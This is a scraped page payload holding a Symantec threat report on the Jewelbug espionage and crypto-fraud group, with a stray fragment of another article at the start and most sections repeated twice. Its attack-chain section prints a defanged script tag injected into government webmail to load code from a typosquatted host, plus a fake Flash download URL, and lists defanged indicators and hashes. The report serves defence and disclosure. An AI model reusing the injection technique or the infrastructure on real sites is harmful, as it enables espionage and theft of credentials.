href=\"https://www.symantec.com/security-center/writeup/2019-040311-4417-99\"\u003eW32.Beapy\u003c/a\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003ca href=\"https://www.symantec.com/security-center/writeup/2012-042615-3731-99\"\u003eHacktool.Mimikatz\u003c/a\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003ca href=\"https://www.symantec.com/security-center/writeup/2018-020707-5228-99\"\u003eMSH.Bluwimps\u003c/a\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003ca href=\"https://www.symantec.com/security-center/writeup/2017-042122-0603-99\"\u003eBackdoor.Doublepulsar\u003c/a\u003e\u003c/li\u003e\r\n\u003c/ul\u003e\r\n\r\n\u003cp\u003eSymantec \u003ca href=\"https://www.symantec.com/products/email-security-cloud\"\u003eEmail Security.cloud\u003c/a\u003e technology blocks email\u0026nbsp;spreading this threat using advanced heuristics.\u003c/p\u003e\r\n\r\n\u003ch2\u003eFurther Reading\u003c/h2\u003e\r\n\r\n\u003cp\u003eFor more information about cryptojacking, read our whitepaper:\u003c/p\u003e\r\n\r\n\u003cul\u003e\r\n\t\u003cli\u003e\u0026nbsp;\u003ca href=\"https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-cryptojacking-modern-cash-cow-en.pdf\"\u003eCryptojacking: A Modern Cash Cow\u003c/a\u003e\u003c/li\u003e\r\n\u003c/ul\u003e\r\n14:Tf4b,\u003ch2\u003eKey findings\u003c/h2\u003e\u003cul type=\"disc\"\u003e\u003cli data-list-item-id=\"e6bd68fea1b61f11b710e5ad01d6d5dac\"\u003eJewelbug is a China-based hackers-for-hire group that runs parallel operations: espionage against governments and militaries across the Middle East, Southeast Asia and South Asia, and a for-profit cryptocurrency fraud business.\u003c/li\u003e\u003cli data-list-item-id=\"e7fe0dd93aa9775462c624501b8d41acc\"\u003eBoth missions are administered from a single control panel, XG-Web, a browser-centric remote-access and information-stealing framework that turns a victim’s browser into a full remote-control channel and reaches from there into the host and the internal network behind it.\u003c/li\u003e\u003cli data-list-item-id=\"e9e2a8557425482a82a1474b25fe05079\"\u003eAt least one of the operators is tied to a registered Hunan company, and we have identified the sole legal representative by name from government-issued identity documents belonging to the operators.\u003c/li\u003e\u003cli data-list-item-id=\"eae7093cb3087bfe7d3608add78c72da5\"\u003eJewelbug’s main implant is the Antino backdoor. It also operates a malicious Chrome and Firefox extension posing as an application called “PDF Viewer”, paired with a helper disguised as a Microsoft Edge component that gave operators a command shell on the host.\u003c/li\u003e\u003cli data-list-item-id=\"ea779254106668f0ccd84fad44edd207e\"\u003eIn its largest operation, a single planted script placed a watering-hole on more than 15 government webmail tenants in a Middle Eastern country at once.\u003c/li\u003e\u003cli data-list-item-id=\"ed859ab3c91b6937e04b287d17ce13120\"\u003eJewelbug’s victim database recorded more than one million implant check-ins and more than 580,000 stolen browser cookies in less than three months of active operations. One set of implants was configured to utilize the internal proxy of a major U.S. aerospace and industrial manufacturer.\u003c/li\u003e\u003c/ul\u003e\u003ch2\u003eOverview\u003c/h2\u003e\u003cp\u003eA months-long investigation by the Symantec Threat Hunter Team has produced unprecedented visibility into the activities of Jewelbug (aka Earth Alux, REF7707, CL-STA-0049), a China-based APT group that has been breaking into government ministries across Asia and the Middle East while quietly running a cryptocurrency fraud business on the side. The two are not separate ventures that happen to share a name: our investigation revealed they are run by the same small team, on shared infrastructure, from one control panel.\u003c/p\u003e\u003cp\u003eJewelbug’s commercial arm is tied to a known registered company in Hunan Province, China. The group has developed five generations of command-and-control (C\u0026amp;C) code and a family of implants spanning browsers, Windows endpoints, Linux servers and network devices, all of it feeding a single database of victims. That toolset serves two missions: espionage attacks against foreign governments and militaries, and for-profit crypto fraud aimed at Chinese-speaking victims.\u003c/p\u003e\u003ch2\u003eTargeting\u003c/h2\u003e\u003cp\u003eThe clearest statement of intent is the group's own campaign list, because each entry is a campaign the operators created and named themselves. On the espionage side, campaigns targeted government organizations across the Middle East and Southeast Asia. Other lists targeted more than 90 police and government email addresses in South Asia.\u003c/p\u003e\u003cp\u003eThe group's separate Linux and router implant enables it to extend its reach into network infrastructure, with a couple of builds configured to beacon through the internal corporate proxy of a major U.S. aerospace and industrial manufacturer.\u0026nbsp;\u003c/p\u003e\u003cp\u003eA parallel, financially motivated operation targeted Chinese-speaking cryptocurrency users through fake exchange-download portals. Decoy documents styled after Taiwanese government bodies suggest its interest also extended to Taiwan. The common thread across espionage targets is government communications and the providers that host them, which would give an intelligence customer broad, durable access to official correspondence.\u003c/p\u003e15:Tb4f,\u003ch3\u003eThe “PDF Viewer” extension and its native shell\u003c/h3\u003e\u003cp\u003eThe group's primary implant was a malicious browser extension named “PDF Viewer”, which was built to run in both Chrome and Firefox. Masquerading as a document reader, it requested effectively every dangerous permission the browser exposes: cookies, scripting, debugger access, web request interception, download monitoring, and native messaging across all sites. A background service worker acted as a full remote bridge into the browser API. An operator could invoke any Chrome or Firefox function on the victim's behalf by name, inject and execute arbitrary JavaScript on any page, and interact with the browser as if sitting at the keyboard.\u003c/p\u003e\u003cp\u003eThe extension harvested credentials by hooking login forms, exfiltrated the victim's full cookie jar,\u0026nbsp;subscribed to live cookie-change events to steal new session tokens in near real time, and captured history, bookmarks, screenshots, the clipboard and intercepted traffic. A clipboard module capable of silently swapping a copied cryptocurrency address for the attacker’s own is built into the codebase. The module has been active on victims, but no address-replacement rules were deployed, meaning the swapping feature was not used during the observed campaign period. To escape the browser sandbox, the extension talked to a Windows helper registered as a native-messaging host under the misleading name com.microsoft.runedge, which ran operator commands through the Windows command interpreter and returned the output to the panel.\u003c/p\u003e\u003ch3\u003eThe Antino backdoor\u003c/h3\u003e\u003cp\u003eAntino is the group's Windows backdoor and the payload behind a wave of malicious HTML Application (HTA) downloaders, themed on current geopolitical events, that prompted this investigation. It is also delivered as a fake Adobe Flash or Adobe installer (file names such as flashcenter_pp_ax_install_en.exe and Adobeinstall.exe) downloaded from group-controlled domains.\u0026nbsp;\u003c/p\u003e\u003cp\u003eOnce running, Antino uses the Microsoft Graph API as its C\u0026amp;C channel, hiding its traffic inside legitimate Microsoft cloud services. It is a shared tool used across the group's campaigns, recovered from infected hosts in the Middle East and submitted to public scanners from victims in the Middle East and South Asia, and it is the on-host backdoor that the fake-update lure seen in \u003cem\u003eFigure 2\u003c/em\u003e ultimately installs on the endpoint. The lure in \u003cem\u003eFigure 2\u0026nbsp;\u003c/em\u003eis attempting to impersonate an invitation to an event run by the\u0026nbsp;\u003ca href=\"https://www.csis.org/\"\u003eCenter for Strategic and International Studies\u003c/a\u003e, a Washington-based think tank\u0026nbsp;working across the areas of defense and security, geopolitics and foreign policy, economic security and technology, and global development. This lure serves to illustrate the types of areas and sort of people Jewelbug may be hoping to compromise.\u003c/p\u003e16:T1a41,\u003ch3\u003eClientKing, a Linux and router implant\u003c/h3\u003e\u003cp\u003eAlongside the browser framework, the group operates 37 builds of a Rust implant the developers call ClientKing, which reached servers and network devices rather than browsers. It supported five C\u0026amp;C transports, including a custom domain-name-system (DNS) tunnel, and offered a full interactive shell, SOCKS pivoting and the ability to load kernel modules directly from memory. A companion toolkit added a kernel-module rootkit and a malicious authentication module hooked into the secure shell su and sudo to steal credentials. Builds spanned x86-64 servers, ARM64 devices and ASUS consumer routers. The most recent were stamped with the internal corporate proxy of a major U.S. aerospace and industrial manufacturer. ClientKing's C\u0026amp;C server was also hosted on the same network range as the XG-Web server.\u003c/p\u003e\u003ch3\u003eCommand-and-control through Google Docs\u003c/h3\u003e\u003cp\u003eFor delivery, the framework served a freshly obfuscated payload on every request. This was XOR encoded with a random key so no two downloads were identical, and the group disguised its C\u0026amp;C hostnames as typosquats of common resources such as Google Fonts. When an operator activated a campaign, the backend created a public Google Document, wrote an obfuscated payload into the body, and had implants fetch the documents and execute the payloads, which resolve to Google-owned infrastructure unlikely to be blocked by reputation filtering. Thirteen such documents were live and mapped to active campaigns.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eTargeting on a large scale\u003c/h2\u003e\u003cp\u003eThe scale of the operation is vast. Jewelbug’s victim database holds more than one million implant check-in rows, more than 580,000 stolen browser cookies, several thousand captured credentials, and more than 2,300 exfiltrated email bodies. Request logs showed operators using a browser foothold to reach internal infrastructure, including authenticated traffic to a virtualization-management cluster inside a Middle Eastern government network. Runtime server logs recorded roughly 1.1 million geolocation events against approximately 4,300 distinct source IP addresses: approximately 87,200 connections from a Southeast Asian country (targeting state telecom and military networks), approximately 53,100 from a Middle Eastern country (across the national carrier’s ranges, including Starlink-connected addresses in the capital), and approximately 15,000 from a second Southeast Asian country (including government ministry infrastructure).\u003c/p\u003e\u003ch2\u003eA parallel crypto-fraud business\u003c/h2\u003e\u003cp\u003eThe financial side of the operation is run as a registered Chinese company advertising a commercial “search-ranking rental” service on Telegram. The infrastructure was a search-engine-optimization (SEO) poisoning pipeline: an artificial-intelligence article generator that produced thousands of fake exchange-download pages, a fleet of more than 40 content-management servers, and click-fraud bots that drove search engines to rank those pages. The operators registered hundreds of look-alike domains impersonating the OKX and Binance exchanges and cloaked the pages so that crawlers saw phishing content while ordinary visitors were redirected.\u003c/p\u003e\u003ch2\u003eOperator tradecraft\u003c/h2\u003e\u003cp\u003eThe operators work from inside China. Their virtual private network (VPN) routing profile is configured to bypass mainland-Chinese destinations while tunnelling everything else, the behavior of a user circumventing domestic filtering rather than concealing a foreign origin, and their working pattern is concentrated in the afternoons and late evenings of the UTC+8 time zone. Operational discipline is uneven: the group repeatedly tests its own stealer against its own browsers, runs the panel front end in development mode on a live production server, and reuses a single credential set across the panel and its commercial server fleet.\u003c/p\u003e\u003ch2\u003eAttack chain example: watering-hole compromise of a Middle Eastern government webmail system\u003c/h2\u003e\u003cp\u003eJewelbug's largest espionage operation was a wide-ranging compromise of a Middle Eastern government. The operation is representative of how its campaigns proceeded.\u003c/p\u003e\u003cp\u003eRather than breach each ministry separately, Jewelbug compromised the shared web-hosting platform run by the state telecommunications provider and national network-services agency, obtaining write access to the common webmail installation, and added a single script tag. Every government tenant on that platform had a watering-hole planted on it at once. A single campaign spanned more than 15 government webmail tenants, with the hook firing on the login page and every mailbox view, indicating it sat in the shared template rather than being delivered per user. The group also hooked the hosting provider's own administrators to harvest the credentials that granted that write access. The injected tag was disguised as an ordinary site asset:\u003c/p\u003e\u003cp\u003e\u003ccode\u003e\u0026lt;script src=“hxxps://fonts.chrorne[.]com/dist/js/12.qgfvjzvs.chunk.js”\u0026gt;\u0026lt;/script\u0026gt;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eWhen a ministry staff member logged in, the script opened a WebSocket to the C\u0026amp;C, completed the cryptographic handshake and reported in. A cookie module exfiltrated the page's cookies, and a labelling module read the username from the webmail interface and tagged the new victim with their government email address. The operators then pushed a “flash” lure module, which confirmed the address ended in one of nine targeted government domains, that the account was not already compromised, and that the host was running Windows, before overlaying a fake Adobe Flash update prompt. When the victim clicked to update, the browser downloaded the second-stage executable from a group-controlled domain:\u003c/p\u003e\u003cp class=\"Code\"\u003e\u003ccode\u003ehxxps://microsoft-flash[.]com/download/Adobeinstall.exe\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe downloaded executable was the group's Antino backdoor, a fake Adobe Flash or Adobe installer that beacons to the Microsoft Graph API for C\u0026amp;C. It also sideloaded the “PDF Viewer” extension into the victim's browser profile, dropped the native-messaging helper, and wrote the registry value that enabled it:\u003c/p\u003e\u003cp class=\"Code\"\u003e\u003ccode\u003eHKCU\\SOFTWARE\\Google\\Chrome\\NativeMessagingHosts\\com.microsoft.runedge\u003c/code\u003e\u003c/p\u003e\u003cp\u003eOn the next launch, the extension connected to the C\u0026amp;C with the full browser API bridge available, giving operators unrestricted access to the browser and, through native messaging, the host. For at least one victim, it captured authenticated traffic to an internal virtualization-management interface, showing operators were actively reaching internal infrastructure:\u003c/p\u003e\u003cp class=\"Code\"\u003e\u003ccode\u003ehxxps://192.168.x.x:8006/api2/json/cluster/resources\u003c/code\u003e\u003c/p\u003e17:Ta8a,\u003ch2\u003eAttribution\u003c/h2\u003e\u003cp\u003eOn the panel, the operators worked under the usernames “admin” and “admin_s”, the latter chose the display nickname “ople500”, and the exploit-module library was signed “Xg Team.” We assess with high confidence that the cryptocurrency fraud and SEO arm of the operation is run by a named individual, the sole legal representative of a Changsha company that openly describes itself as an SEO business. The attribution rests on government-issued identity documents, a company business license, and a signed and stamped authorization letter belonging to the operators.\u003c/p\u003e\u003cp\u003eAcross the operation he used the handle “paopaodada” (Bubble Boss), advertised on Telegram as the contact for a “website ranking rental” service and reused as the admin login across his fleet of content-management servers. The precise relationship between this individual and the operators running the espionage campaigns is not fully established; the two activities shared the same infrastructure, overlapping techniques and one control panel. We assess it most likely that the SEO business supplied access, infrastructure and delivery to the espionage operation rather than that one person was performing both roles.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eSignificance\u003c/h2\u003e\u003cp\u003eWhat makes Jewelbug notable is the combination of two missions in one set of hands. Foreign government and foreign military espionage was run from the same infrastructure, by the same team, as a commodity cryptocurrency fraud business. That pairing is the signature of a hack-for-hire entity that is running for-profit crime on the side.\u003c/p\u003e\u003cp\u003eThe exposure also shows the difference between targeting and compromise. Its database did not merely list intended victims: it recorded more than one million implant check-ins, hundreds of thousands of stolen cookies, and intercepted internal network traffic and the harvested mailboxes of senior government officials. Compromising a shared hosting provider and placing a watering-hole on every government tenant on it in one move turned a single intrusion into access across an entire national webmail estate.\u003c/p\u003e\u003ch2\u003eProtection\u003c/h2\u003e\u003cp\u003eFor the latest protection updates, please visit the\u0026nbsp;\u003ca href=\"https://www.broadcom.com/support/security-center/protection-bulletin\"\u003eSymantec Protection Bulletin\u003c/a\u003e.\u003c/p\u003e\u003cp\u003eIf an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\u003c/p\u003e\u003ch2\u003eFurther Reading\u003c/h2\u003e\u003cp\u003eRead more about Jewelbug and its activity in our accompanying whitepaper on this topic: \u003ca href=\"https://sed-cms.broadcom.com/sites/default/files/2026-08/Jewelbug%20Dossier.pdf\"\u003e\u003cem\u003eThe Jewelbug host\u003c/p\u003e\u003cp\u003e\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eNetwork indicators\u003c/strong\u003e\u003c/p\u003e\u003cp\u003efonts[.]tarotfree101[.]top\u003c/p\u003e\u003cp\u003efonts[.]chrorne[.]com\u003c/p\u003e\u003cp\u003erobot[.]avbliud[.]com\u003c/p\u003e\u003cp\u003emicrosoft-flash[.]com\u003c/p\u003e\u003cp\u003ewww[.]wps-cn[.]com\u003c/p\u003e\u003cp\u003ewww[.]f1ash[.]org[.]cn\u003c/p\u003e\u003cp\u003ebrowser-update[.]pages[.]dev\u003c/p\u003e\u003cp\u003eeastus2[.]wac-azure[.]com\u003c/p\u003e\u003cp\u003emailbycloud[.]com\u003c/p\u003e\u003cp\u003ewww[.]jkskhei[.]com\u003c/p\u003e\u003cp\u003ens1[.]jkskhei[.]com\u003c/p\u003e\u003cp\u003edns[.]wizkidblogger[.]com\u003c/p\u003e\u003cp\u003er6fi2yvqql[.]execute-api[.]ap-southeast-2[.]amazonaws[.]com\u003c/p\u003e\u003cp\u003e103[.]87[.]9[.]62\u003c/p\u003e\u003cp\u003e152[.]42[.]174[.]151\u003c/p\u003e\u003cp\u003e43[.]246[.]208[.]236\u003c/p\u003e\u003cp\u003e43[.]246[.]208[.]179\u003c/p\u003e\u003cp\u003e47[.]84[.]37[.]113\u003c/p\u003e\u003cp\u003e47[.]84[.]51[.]173\u003c/p\u003e\u003cp\u003e167[.]71[.]195[.]255\u003c/p\u003e\u003cp\u003e38[.]12[.]1[.]47\u003c/p\u003e\u003cp\u003e129[.]212[.]237[.]224\u003c/p\u003e\u003cp\u003e47[.]87[.]71[.]167\u003c/p\u003e\u003cp\u003e47[.]250[.]208[.]35\u003c/p\u003e\u003cp\u003e219[.]76[.]254[.]184\u003c/p\u003e\u003cp\u003ehxxp://d2nq35tel3ucuo[.]cloudfront[.]net/LtVGUSsyUTDA.log\u003c/p\u003e\u003cp\u003ehxxps://pub-abfa7742e315485a98a5fafd6dbfb68e[.]r2[.]dev/hjgzBskgslc.dll.iwq\u003c/p\u003e\u003cp\u003ehxxps://microsoft-flash[.]com/download/flashcenter_pp_ax_install_en.exe\u003c/p\u003e\u003cp\u003ehxxps://www[.]f1ash[.]org[.]cn/flashcenter_pp_ax_install_cn.exe\u003c/p\u003e19:Tf4b,\u003ch2\u003eKey findings\u003c/h2\u003e\u003cul type=\"disc\"\u003e\u003cli data-list-item-id=\"e6bd68fea1b61f11b710e5ad01d6d5dac\"\u003eJewelbug is a China-based hackers-for-hire group that runs parallel operations: espionage against governments and militaries across the Middle East, Southeast Asia and South Asia, and a for-profit cryptocurrency fraud business.\u003c/li\u003e\u003cli data-list-item-id=\"e7fe0dd93aa9775462c624501b8d41acc\"\u003eBoth missions are administered from a single control panel, XG-Web, a browser-centric remote-access and information-stealing framework that turns a victim’s browser into a full remote-control channel and reaches from there into the host and the internal network behind it.\u003c/li\u003e\u003cli data-list-item-id=\"e9e2a8557425482a82a1474b25fe05079\"\u003eAt least one of the operators is tied to a registered Hunan company, and we have identified the sole legal representative by name from government-issued identity documents belonging to the operators.\u003c/li\u003e\u003cli data-list-item-id=\"eae7093cb3087bfe7d3608add78c72da5\"\u003eJewelbug’s main implant is the Antino backdoor. It also operates a malicious Chrome and Firefox extension posing as an application called “PDF Viewer”, paired with a helper disguised as a Microsoft Edge component that gave operators a command shell on the host.\u003c/li\u003e\u003cli data-list-item-id=\"ea779254106668f0ccd84fad44edd207e\"\u003eIn its largest operation, a single planted script placed a watering-hole on more than 15 government webmail tenants in a Middle Eastern country at once.\u003c/li\u003e\u003cli data-list-item-id=\"ed859ab3c91b6937e04b287d17ce13120\"\u003eJewelbug’s victim database recorded more than one million implant check-ins and more than 580,000 stolen browser cookies in less than three months of active operations. One set of implants was configured to utilize the internal proxy of a major U.S. aerospace and industrial manufacturer.\u003c/li\u003e\u003c/ul\u003e\u003ch2\u003eOverview\u003c/h2\u003e\u003cp\u003eA months-long investigation by the Symantec Threat Hunter Team has produced unprecedented visibility into the activities of Jewelbug (aka Earth Alux, REF7707, CL-STA-0049), a China-based APT group that has been breaking into government ministries across Asia and the Middle East while quietly running a cryptocurrency fraud business on the side. The two are not separate ventures that happen to share a name: our investigation revealed they are run by the same small team, on shared infrastructure, from one control panel.\u003c/p\u003e\u003cp\u003eJewelbug’s commercial arm is tied to a known registered company in Hunan Province, China. The group has developed five generations of command-and-control (C\u0026amp;C) code and a family of implants spanning browsers, Windows endpoints, Linux servers and network devices, all of it feeding a single database of victims. That toolset serves two missions: espionage attacks against foreign governments and militaries, and for-profit crypto fraud aimed at Chinese-speaking victims.\u003c/p\u003e\u003ch2\u003eTargeting\u003c/h2\u003e\u003cp\u003eThe clearest statement of intent is the group's own campaign list, because each entry is a campaign the operators created and named themselves. On the espionage side, campaigns targeted government organizations across the Middle East and Southeast Asia. Other lists targeted more than 90 police and government email addresses in South Asia.\u003c/p\u003e\u003cp\u003eThe group's separate Linux and router implant enables it to extend its reach into network infrastructure, with a couple of builds configured to beacon through the internal corporate proxy of a major U.S. aerospace and industrial manufacturer.\u0026nbsp;\u003c/p\u003e\u003cp\u003eA parallel, financially motivated operation targeted Chinese-speaking cryptocurrency users through fake exchange-download portals. Decoy documents styled after Taiwanese government bodies suggest its interest also extended to Taiwan. The common thread across espionage targets is government communications and the providers that host them, which would give an intelligence customer broad, durable access to official correspondence.\u003c/p\u003e1a:Tb4f,\u003ch3\u003eThe “PDF Viewer” extension and its native shell\u003c/h3\u003e\u003cp\u003eThe group's primary implant was a malicious browser extension named “PDF Viewer”, which was built to run in both Chrome and Firefox. Masquerading as a document reader, it requested effectively every dangerous permission the browser exposes: cookies, scripting, debugger access, web request interception, download monitoring, and native messaging across all sites. A background service worker acted as a full remote bridge into the browser API. An operator could invoke any Chrome or Firefox function on the victim's behalf by name, inject and execute arbitrary JavaScript on any page, and interact with the browser as if sitting at the keyboard.\u003c/p\u003e\u003cp\u003eThe extension harvested credentials by hooking login forms, exfiltrated the victim's full cookie jar,\u0026nbsp;subscribed to live cookie-change events to steal new session tokens in near real time, and captured history, bookmarks, screenshots, the clipboard and intercepted traffic. A clipboard module capable of silently swapping a copied cryptocurrency address for the attacker’s own is built into the codebase. The module has been active on victims, but no address-replacement rules were deployed, meaning the swapping feature was not used during the observed campaign period. To escape the browser sandbox, the extension talked to a Windows helper registered as a native-messaging host under the misleading name com.microsoft.runedge, which ran operator commands through the Windows command interpreter and returned the output to the panel.\u003c/p\u003e\u003ch3\u003eThe Antino backdoor\u003c/h3\u003e\u003cp\u003eAntino is the group's Windows backdoor and the payload behind a wave of malicious HTML Application (HTA) downloaders, themed on current geopolitical events, that prompted this investigation. It is also delivered as a fake Adobe Flash or Adobe installer (file names such as flashcenter_pp_ax_install_en.exe and Adobeinstall.exe) downloaded from group-controlled domains.\u0026nbsp;\u003c/p\u003e\u003cp\u003eOnce running, Antino uses the Microsoft Graph API as its C\u0026amp;C channel, hiding its traffic inside legitimate Microsoft cloud services. It is a shared tool used across the group's campaigns, recovered from infected hosts in the Middle East and submitted to public scanners from victims in the Middle East and South Asia, and it is the on-host backdoor that the fake-update lure seen in \u003cem\u003eFigure 2\u003c/em\u003e ultimately installs on the endpoint. The lure in \u003cem\u003eFigure 2\u0026nbsp;\u003c/em\u003eis attempting to impersonate an invitation to an event run by the\u0026nbsp;\u003ca href=\"https://www.csis.org/\"\u003eCenter for Strategic and International Studies\u003c/a\u003e, a Washington-based think tank\u0026nbsp;working across the areas of defense and security, geopolitics and foreign policy, economic security and technology, and global development. This lure serves to illustrate the types of areas and sort of people Jewelbug may be hoping to compromise.\u003c/p\u003e1b:T1a41,\u003ch3\u003eClientKing, a Linux and router implant\u003c/h3\u003e\u003cp\u003eAlongside the browser framework, the group operates 37 builds of a Rust implant the developers call ClientKing, which reached servers and network devices rather than browsers. It supported five C\u0026amp;C transports, including a custom domain-name-system (DNS) tunnel, and offered a full interactive shell, SOCKS pivoting and the ability to load kernel modules directly from memory. A companion toolkit added a kernel-module rootkit and a malicious authentication module hooked into the secure shell su and sudo to steal credentials. Builds spanned x86-64 servers, ARM64 devices and ASUS consumer routers. The most recent were stamped with the internal corporate proxy of a major U.S. aerospace and industrial manufacturer. ClientKing's C\u0026amp;C server was also hosted on the same network range as the XG-Web server.\u003c/p\u003e\u003ch3\u003eCommand-and-control through Google Docs\u003c/h3\u003e\u003cp\u003eFor delivery, the framework served a freshly obfuscated payload on every request. This was XOR encoded with a random key so no two downloads were identical, and the group disguised its C\u0026amp;C hostnames as typosquats of common resources such as Google Fonts. When an operator activated a campaign, the backend created a public Google Document, wrote an obfuscated payload into the body, and had implants fetch the documents and execute the payloads, which resolve to Google-owned infrastructure unlikely to be blocked by reputation filtering. Thirteen such documents were live and mapped to active campaigns.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eTargeting on a large scale\u003c/h2\u003e\u003cp\u003eThe scale of the operation is vast. Jewelbug’s victim database holds more than one million implant check-in rows, more than 580,000 stolen browser cookies, several thousand captured credentials, and more than 2,300 exfiltrated email bodies. Request logs showed operators using a browser foothold to reach internal infrastructure, including authenticated traffic to a virtualization-management cluster inside a Middle Eastern government network. Runtime server logs recorded roughly 1.1 million geolocation events against approximately 4,300 distinct source IP addresses: approximately 87,200 connections from a Southeast Asian country (targeting state telecom and military networks), approximately 53,100 from a Middle Eastern country (across the national carrier’s ranges, including Starlink-connected addresses in the capital), and approximately 15,000 from a second Southeast Asian country (including government ministry infrastructure).\u003c/p\u003e\u003ch2\u003eA parallel crypto-fraud business\u003c/h2\u003e\u003cp\u003eThe financial side of the operation is run as a registered Chinese company advertising a commercial “search-ranking rental” service on Telegram. The infrastructure was a search-engine-optimization (SEO) poisoning pipeline: an artificial-intelligence article generator that produced thousands of fake exchange-download pages, a fleet of more than 40 content-management servers, and click-fraud bots that drove search engines to rank those pages. The operators registered hundreds of look-alike domains impersonating the OKX and Binance exchanges and cloaked the pages so that crawlers saw phishing content while ordinary visitors were redirected.\u003c/p\u003e\u003ch2\u003eOperator tradecraft\u003c/h2\u003e\u003cp\u003eThe operators work from inside China. Their virtual private network (VPN) routing profile is configured to bypass mainland-Chinese destinations while tunnelling everything else, the behavior of a user circumventing domestic filtering rather than concealing a foreign origin, and their working pattern is concentrated in the afternoons and late evenings of the UTC+8 time zone. Operational discipline is uneven: the group repeatedly tests its own stealer against its own browsers, runs the panel front end in development mode on a live production server, and reuses a single credential set across the panel and its commercial server fleet.\u003c/p\u003e\u003ch2\u003eAttack chain example: watering-hole compromise of a Middle Eastern government webmail system\u003c/h2\u003e\u003cp\u003eJewelbug's largest espionage operation was a wide-ranging compromise of a Middle Eastern government. The operation is representative of how its campaigns proceeded.\u003c/p\u003e\u003cp\u003eRather than breach each ministry separately, Jewelbug compromised the shared web-hosting platform run by the state telecommunications provider and national network-services agency, obtaining write access to the common webmail installation, and added a single script tag. Every government tenant on that platform had a watering-hole planted on it at once. A single campaign spanned more than 15 government webmail tenants, with the hook firing on the login page and every mailbox view, indicating it sat in the shared template rather than being delivered per user. The group also hooked the hosting provider's own administrators to harvest the credentials that granted that write access. The injected tag was disguised as an ordinary site asset:\u003c/p\u003e\u003cp\u003e\u003ccode\u003e\u0026lt;script src=“hxxps://fonts.chrorne[.]com/dist/js/12.qgfvjzvs.chunk.js”\u0026gt;\u0026lt;/script\u0026gt;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eWhen a ministry staff member logged in, the script opened a WebSocket to the C\u0026amp;C, completed the cryptographic handshake and reported in. A cookie module exfiltrated the page's cookies, and a labelling module read the username from the webmail interface and tagged the new victim with their government email address. The operators then pushed a “flash” lure module, which confirmed the address ended in one of nine targeted government domains, that the account was not already compromised, and that the host was running Windows, before overlaying a fake Adobe Flash update prompt. When the victim clicked to update, the browser downloaded the second-stage executable from a group-controlled domain:\u003c/p\u003e\u003cp class=\"Code\"\u003e\u003ccode\u003ehxxps://microsoft-flash[.]com/download/Adobeinstall.exe\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe downloaded executable was the group's Antino backdoor, a fake Adobe Flash or Adobe installer that beacons to the Microsoft Graph API for C\u0026amp;C. It also sideloaded the “PDF Viewer” extension into the victim's browser profile, dropped the native-messaging helper, and wrote the registry value that enabled it:\u003c/p\u003e\u003cp class=\"Code\"\u003e\u003ccode\u003eHKCU\\SOFTWARE\\Google\\Chrome\\NativeMessagingHosts\\com.microsoft.runedge\u003c/code\u003e\u003c/p\u003e\u003cp\u003eOn the next launch, the extension connected to the C\u0026amp;C with the full browser API bridge available, giving operators unrestricted access to the browser and, through native messaging, the host. For at least one victim, it captured authenticated traffic to an internal virtualization-management interface, showing operators were actively reaching internal infrastructure:\u003c/p\u003e\u003cp class=\"Code\"\u003e\u003ccode\u003ehxxps://192.168.x.x:8006/api2/json/cluster/resources\u003c/code\u003e\u003c/p\u003e1c:Ta8a,\u003ch2\u003eAttribution\u003c/h2\u003e\u003cp\u003eOn the panel, the operators worked under the usernames “admin” and “admin_s”, the latter chose the display nickname “ople500”, and the exploit-module library was signed “Xg Team.” We assess with high confidence that the cryptocurrency fraud and SEO arm of the operation is run by a named individual, the sole legal representative of a Changsha company that openly describes itself as an SEO business. The attribution rests on government-issued identity documents, a company business license, and a signed and stamped authorization letter belonging to the operators.\u003c/p\u003e\u003cp\u003eAcross the operation he used the handle “paopaodada” (Bubble Boss), advertised on Telegram as the contact for a “website ranking rental” service and reused as the admin login across his fleet of content-management servers. The precise relationship between this individual and the operators running the espionage campaigns is not fully established; the two activities shared the same infrastructure, overlapping techniques and one control panel. We assess it most likely that the SEO business supplied access, infrastructure and delivery to the espionage operation rather than that one person was performing both roles.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eSignificance\u003c/h2\u003e\u003cp\u003eWhat makes Jewelbug notable is the combination of two missions in one set of hands. Foreign government and foreign military espionage was run from the same infrastructure, by the same team, as a commodity cryptocurrency fraud business. That pairing is the signature of a hack-for-hire entity that is running for-profit crime on the side.\u003c/p\u003e\u003cp\u003eThe exposure also shows the difference between targeting and compromise. Its database did not merely list intended victims: it recorded more than one million implant check-ins, hundreds of thousands of stolen cookies, and intercepted internal network traffic and the harvested mailboxes of senior government officials. Compromising a shared hosting provider and placing a watering-hole on every government tenant on it in one move turned a single intrusion into access across an entire national webmail estate.\u003c/p\u003e\u003ch2\u003eProtection\u003c/h2\u003e\u003cp\u003eFor the latest protection updates, please visit the\u0026nbsp;\u003ca href=\"https://www.broadcom.com/support/security-center/protection-bulletin\"\u003eSymantec Protection Bulletin\u003c/a\u003e.\u003c/p\u003e\u003cp\u003eIf an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\u003c/p\u003e\u003ch2\u003eFurther Reading\u003c/h2\u003e\u003cp\u003eRead more about Jewelbug and its activity in our accompanying whitepaper on this topic: \u003ca href=\"https://sed-cms.broadcom.com/sites/default/files/2026-08/Jewelbug%20Dossier.pdf\"\u003e\u003cem\u003eThe Jewelbug document\u003c/p\u003e\u003cp\u003ef1ef5fe4c0cdcff13cc750c867728b89719f81437bdc49041edd1ae1f3edb4e8 -- backdoor\u0026nbsp;\u003c/p\u003e\u003cp\u003ec11714f9fe2df1ca906585c81498cd77f5ec05b132aab73fa3a71d71d71e42cc -- Antino
